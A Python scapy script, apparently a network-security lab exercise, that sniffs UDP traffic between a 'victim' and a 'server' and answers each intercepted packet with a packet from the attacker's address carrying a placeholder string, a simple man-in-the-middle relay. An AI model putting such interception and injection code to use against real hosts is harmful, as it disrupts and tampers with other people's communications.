from scapy.all import *
import threading
from const import Const

C = Const()
victim_tuple = C.victim_tuple
server_tuple = C.server_tuple
attacker_ip = C.attacker_ip

# Configuration
victim_ip = victim_tuple[0]
victim_port = victim_tuple[1]
server_ip = server_tuple[0]
server_port = server_tuple[1]

iface = 'en0'  # Network interface to listen on

print("Configuration:")
print(f"Victim IP: {victim_ip}")
print(f"Attacker IP: {attacker_ip}")
print(f"Server IP: {server_ip}")

def send_pkt(src, dst, sport, dport, data):
    packet = IP(src=src, dst=dst) / UDP(sport=sport, dport=dport) / Raw(load=data)
    print(f"{packet.summary()}")
    send(packet, iface=iface)

def forward_to_destination(packet):
    if packet.haslayer(IP):
        if packet[IP].src == victim_ip:
            print(f"{packet.summary()}")
            send_pkt(attacker_ip, server_ip, victim_port, server_port, "packet from ATTACKER to server")

def forward_to_victim(packet):
    if packet.haslayer(IP):
        if packet[IP].src == server_ip:
            print(f"{packet.summary()}")
            send_pkt(attacker_ip, victim_ip, server_port, victim_port, "packet from ATTACKER to victim")

def sniff_victim_to_server():
    print("Starting sniffer for victim to server")
    sniff(filter=f"udp and src {victim_ip} and dst {server_ip}", prn=forward_to_destination, iface=iface, store=0)

def sniff_server_to_victim():
    print("Starting sniffer for server to victim")
    sniff(filter=f"udp and dst {attacker_ip} and src {server_ip}", prn=forward_to_victim, iface=iface, store=0)

# Run sniffers in separate threads to handle bidirectional sniffing
thread_victim_to_server = threading.Thread(target=sniff_victim_to_server)
thread_server_to_victim = threading.Thread(target=sniff_server_to_victim)

thread_victim_to_server.start()
thread_server_to_victim.start()

thread_victim_to_server.join()
thread_server_to_victim.join()
